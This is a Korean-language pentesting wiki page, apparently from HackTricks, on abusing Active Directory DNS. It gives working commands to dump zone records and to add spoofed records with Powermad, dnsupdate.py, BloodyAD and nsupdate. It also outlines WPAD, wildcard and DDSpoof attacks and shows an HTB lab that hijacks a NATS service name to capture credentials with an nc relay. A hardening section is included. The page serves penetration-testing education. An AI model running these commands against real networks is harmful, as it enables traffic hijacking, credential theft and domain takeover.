# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

기본적으로 Active Directory의 **모든 사용자**는 Domain 또는 Forest DNS zones의 **모든 DNS records를 열거**할 수 있으며, 이는 zone transfer와 유사합니다(사용자는 AD 환경에서 DNS zone의 하위 객체를 나열할 수 있습니다).

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) tool을 사용하면 내부 네트워크의 recon 목적으로 zone의 **모든 DNS records를 열거**하고 **export**할 수 있습니다.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (2025년 4월)는 JSON/Greppable (`--json`) 출력, multi-threaded DNS resolution, 그리고 LDAPS에 바인딩할 때 TLS 1.2/1.3 지원을 추가합니다

자세한 내용은 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>를 참고하세요.

---

## 레코드 생성 / 수정 (ADIDNS spoofing)

기본적으로 **Authenticated Users** 그룹은 zone DACL에 **Create Child** 권한을 가지므로, 모든 domain account(또는 computer account)가 추가 레코드를 등록할 수 있습니다. 이는 traffic hijacking, NTLM relay coercion, 심지어 전체 domain compromise에 사용될 수 있습니다.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py는 Impacket ≥0.12.0에 포함되어 있습니다.)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 일반적인 attack primitives

1. **Wildcard record** – `*.<zone>`은 AD DNS server를 LLMNR/NBNS spoofing과 유사한 enterprise-wide responder로 전환합니다. 이를 악용해 NTLM hashes를 캡처하거나 LDAP/SMB로 relay할 수 있습니다.  (WINS-lookup이 비활성화되어 있어야 합니다.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – `wpad`를 추가하거나 (**NS** record가 attacker host를 가리키도록 설정해 Global-Query-Block-List를 우회) outbound HTTP requests를 transparently proxy하여 credentials를 수집합니다. Microsoft는 wildcard/ DNAME bypasses (CVE-2018-8320)를 patch했지만 **NS-records는 여전히 작동합니다**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – 이전에 workstation에 할당되었던 IP address를 차지하면 연결된 DNS entry가 계속 resolve되므로 DNS를 전혀 건드리지 않고 resource-based constrained delegation 또는 Shadow-Credentials attacks를 수행할 수 있습니다.
4. **DHCP → DNS spoofing** – 기본 Windows DHCP+DNS deployment에서는 동일 subnet의 unauthenticated attacker가 forged DHCP requests를 전송해 dynamic DNS updates를 trigger함으로써 기존 A record (Domain Controllers 포함)를 덮어쓸 수 있습니다 (Akamai “DDSpoof”, 2023).  이를 통해 Kerberos/LDAP에 대한 machine-in-the-middle이 가능하며 full domain takeover로 이어질 수 있습니다.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – 자신이 제어하는 machine account의 `dNSHostName`을 변경하고, 일치하는 A record를 등록한 다음, 해당 name에 대한 certificate를 요청해 DC를 impersonate합니다. **Certipy** 또는 **BloodyAD**와 같은 tools가 이 flow를 완전히 자동화합니다.

---

### stale dynamic records를 통한 internal service hijacking (NATS case study)

dynamic updates가 모든 authenticated users에게 계속 open되어 있으면 **de-registered service name을 다시 claim하고 attacker infrastructure를 가리키도록 설정할 수 있습니다**. Mirage HTB DC는 DNS scavenging 이후 hostname `nats-svc.mirage.htb`를 노출했으므로, low-privileged user라면 누구나 다음을 수행할 수 있었습니다:<sup>[[3]](#references)</sup>

1. `dig`로 **record가 missing인지 확인**하고 SOA를 알아냅니다:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **자신이 제어하는 외부/VPN 인터페이스를 향하도록 레코드를 다시 생성합니다:**
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **평문 서비스를 사칭**합니다. NATS 클라이언트는 자격 증명을 전송하기 전에 하나의 `INFO { ... }` 배너를 확인할 것으로 예상하므로, 실제 broker에서 정상적인 배너를 복사하는 것만으로도 secrets를 수집할 수 있습니다:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
하이재킹된 이름을 resolve하는 모든 client는 즉시 JSON `CONNECT` frame (`"user"`/`"pass"` 포함)을 listener로 leak합니다. 공격자 호스트에서 공식 `nats-server -V` binary를 실행하고 log redaction을 비활성화하거나, Wireshark로 session을 sniff하기만 해도 동일한 plaintext credentials를 얻을 수 있습니다. TLS가 optional이었기 때문입니다.

4. **캡처한 creds로 Pivot** – Mirage에서는 탈취한 NATS account에 JetStream access가 제공되었고, 이를 통해 재사용 가능한 AD username/password가 포함된 과거 authentication events가 노출되었습니다.

이 pattern은 unsecured TCP handshake에 의존하는 모든 AD-integrated service(HTTP APIs, RPC, MQTT 등)에 적용됩니다. DNS record가 hijack되면 공격자가 곧 해당 service가 됩니다.

---

## Detection & hardening

* 민감한 zone에서 **Authenticated Users**에 *Create all child objects* 권한을 deny하고, DHCP에서 사용하는 전용 account에 dynamic updates를 delegate합니다.
* dynamic updates가 필요한 경우 zone을 **Secure-only**로 설정하고 DHCP에서 **Name Protection**을 활성화하여, owner computer object만 자신의 record를 overwrite할 수 있도록 합니다.
* DNS Server event ID 257/252(dynamic update), 770(zone transfer) 및 `CN=MicrosoftDNS,DC=DomainDnsZones`에 대한 LDAP writes를 monitor합니다.
* 위험한 이름(`wpad`, `isatap`, `*`)을 의도적으로 benign한 record 또는 Global Query Block List를 통해 block합니다.
* DNS servers에 patch를 적용합니다. 예를 들어 RCE bugs인 CVE-2024-26224 및 CVE-2024-26231은 **CVSS 9.8**에 도달했으며 Domain Controllers를 대상으로 remote exploit이 가능합니다.

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018년, wildcard/WPAD attacks에 대한 여전히 de-facto reference)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (2023년 12월)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
